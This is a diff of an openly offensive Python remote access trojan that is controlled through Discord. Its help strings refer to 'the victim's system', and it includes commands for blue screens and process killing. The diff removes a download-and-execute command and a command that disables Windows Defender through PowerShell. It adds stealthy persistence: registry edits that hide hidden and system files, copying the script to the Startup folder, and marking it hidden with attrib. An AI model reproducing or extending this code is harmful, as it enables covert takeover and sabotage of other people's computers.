@@ -8,7 +8,6 @@ import pyperclip
 import tempfile
 import requests
 import tempfile
-import aiohttp
 import asyncio
 import discord
 import hashlib
@@ -18,6 +17,7 @@ import ctypes
 import psutil
 import shelve
 import shutil
+import winreg
 import time
 import uuid
 import wave
@@ -520,22 +520,6 @@ async def unfreezecursor(ctx):
     except Exception as e:
         await ctx.reply(f"Error executing command: {str(e)}")
 
-@bot.command(help="Downloads and executes a file from the provided URL on the victim's system.")
-async def downloadANDrun(ctx, *, url: str):
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as response:
-                if response.status != 200:
-                    return await ctx.reply("Failed to download the file.")
-                
-                with open("downloaded_file.exe", "wb") as file:
-                    file.write(await response.read())
-                
-        subprocess.Popen("downloaded_file.exe", shell=True)
-        await ctx.reply("Command Executed!")
-    except Exception as e:
-        await ctx.reply(f"Error executing command: {str(e)}")
-
 @bot.command(help="Attempts to trigger a blue screen on the victim's system.")
 async def bluescreen(ctx):
     try:
@@ -608,9 +592,7 @@ async def kill(ctx, arg: str = ""):
 async def website(ctx, *, url: str):
     try:
         webbrowser.open(url)
-        
         time.sleep(3)
-
         pyautogui.hotkey('f11')
         
         await ctx.reply(f"Opened and maximized the website: {url}")
@@ -723,18 +705,14 @@ async def commands(ctx, page: int = 1):
         except asyncio.TimeoutError:
             break
 
-@bot.command(help="Disables Windows Defender on the victim's system.")
-async def disabledefender(ctx):
-    try:
-        command = '''powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"'''
-        os.system(command)
-        await ctx.reply("Command Executed! Windows Defender's Real-Time Monitoring is now disabled.")
-    except Exception as e:
-        await ctx.reply(f"Error executing command: {str(e)}")
-
 @bot.command(help="Makes this script execute on logon (only user that ran this file).")
 async def startup(ctx):
     try:
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
+        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(reg_key)
+        
         script_path = sys.executable
         startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
     
@@ -749,6 +727,9 @@ async def startup(ctx):
             await ctx.reply(f"Moved '{script_name}' to the startup folder.")
         else:
             await ctx.reply(f"Startup folder \"{startup_folder}\" not found.")
+        
+        os.system(f'attrib +h "{destination_path}"')
+
     except Exception as e:
         await ctx.reply(f"Error executing command: {str(e)}")
         
